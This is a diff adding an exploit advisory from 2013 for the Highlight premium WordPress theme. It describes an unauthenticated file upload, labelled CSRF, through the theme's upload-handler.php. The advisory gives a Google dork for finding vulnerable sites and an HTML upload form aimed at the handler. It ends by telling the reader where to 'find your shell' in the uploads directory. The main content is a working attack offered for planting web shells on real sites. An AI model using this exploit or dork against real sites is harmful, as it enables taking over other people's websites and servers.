@@ -1,0 +1,46 @@
+#Title : Wordpress Highlight Premium Themes CSRF File Upload Vulnerability
+
+#Author : DevilScreaM
+
+#Date : 11/10/2013 - 10 November 2013
+
+#Category : Web Applications
+
+#Type : PHP
+
+#Vendor : http://themeforest.net
+
+#Download : http://themeforest.net/item/highlight-powerful-premium-wordpress-theme/168424
+
+#Greetz : 0day-id.com | newbie-security.or.id | Borneo Security | Indonesian Security
+ 	  Indonesian Hacker | Indonesian Exploiter | Indonesian Cyber
+
+#Thanks : ShadoWNamE | gruberr0r | Win32Conficker | Rec0ded |
+
+#Tested : Mozila, Chrome, Opera -> Windows & Linux
+
+#Vulnerabillity : CSRF
+
+#Dork : 
+
+inurl:/wp-content/themes/highlight/
+
+
+CSRF File Upload Vulnerability
+
+Exploit & POC : 
+
+http://site-target/wp-content/themes/highlight/lib/utils/upload-handler.php
+
+Script :
+
+<form enctype="multipart/form-data"
+action="http://127.0.0.1/wp-content/themes/highlight/lib/utils/upload-handler.php" method="post"> 
+Your File: <input name="uploadfile" type="file" /><br /> 
+<input type="submit" value="upload" /> 
+</form> 
+
+
+File Access :
+
+http://site-target/uploads/[years]/[month]/ > find your shell
